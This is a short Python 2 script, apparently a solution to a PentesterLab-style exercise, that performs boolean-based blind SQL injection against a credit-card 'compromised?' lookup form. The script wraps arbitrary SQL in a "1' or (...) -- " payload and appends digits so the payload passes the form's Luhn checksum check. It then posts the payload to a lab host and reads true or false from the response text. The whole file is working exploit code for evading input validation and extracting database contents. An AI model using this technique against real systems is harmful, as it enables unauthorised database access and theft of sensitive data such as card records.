#! /usr/bin/python2

from exceptions import Exception
import requests

def luhnChecksum(card_number):
    digits = card_number
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for x in even_digits:
        if x*2 >= 10:
            total += (x*2-9)
        else:
            total += 2*x
    return total % 10

def getNextLuhn(cc):
    cc.append(0)
    newcsum = luhnChecksum(cc)
    return (10 - newcsum) % 10

class LuhnSqlInterface:
    def __init__(self):
        self.host = 'ptl-33fd8591-95f82499.libcurl.so'
    def runQuery(self, q):
        headers = {
            "Host": self.host,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        print self.prepareQuery(q)
        data = {
            "cc": self.prepareQuery(q),
        }
        # print cc
        r = requests.post('http://'+self.host, headers=headers, data=data)
        if "We have no information that your CC has been compromised" in r.content:
            return False
        elif "Your CC has been compromised" in r.content:
            return True
        else:
            raise Exception("Invalid CC")
    def prepareQuery(self, query):
        q = "1' or ({}) -- ".format(query)
        digits = [int(x) for x in q if x.isdigit()]
        if len(digits) % 2 == 0:
            digits.append(0)
            q+='0'
        next_digit = getNextLuhn(digits)
        q += str(next_digit)
        return q
